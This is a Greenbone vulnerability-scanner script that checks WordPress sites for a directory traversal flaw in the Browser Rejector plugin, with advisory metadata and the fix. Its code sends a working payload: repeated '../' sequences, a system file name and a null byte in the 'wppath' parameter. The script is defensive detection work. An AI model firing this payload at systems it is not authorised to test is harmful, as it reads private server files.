CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Browser Rejector Plugin version 2.10 and prior" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user supplied input to the
  'wppath' parameter in 'wp-content/plugins/browser-rejector/rejectr.js.php',
  which allows attackers to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "Update to the WordPress Browser Rejector Plugin 2.11 or later." );
	script_tag( name: "summary", value: "This host is installed with WordPress Browser Rejector Plugin and is prone
  to remote file inclusion vulnerability." );
	script_oid( "1.3.6.1.4.1.25623.1.0.803209" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 57220 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-17 14:17:27 +0530 (Thu, 17 Jan 2013)" );
	script_name( "WordPress Browser Rejector Plugin Remote File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/51739/" );
	script_xref( name: "URL", value: "http://plugins.trac.wordpress.org/changeset/648432/browser-rejector" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/browser-rejector/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!wpPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: wpPort )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/wp-content/plugins/browser-rejector/rejectr.js.php?" + "wppath=", crap( data: "../", length: 3 * 15 ), files[file], "%00" );
	if(http_vuln_check( port: wpPort, url: url, pattern: file )){
		report = http_report_vuln_url( port: wpPort, url: url );
		security_message( port: wpPort, data: report );
		exit( 0 );
	}
}

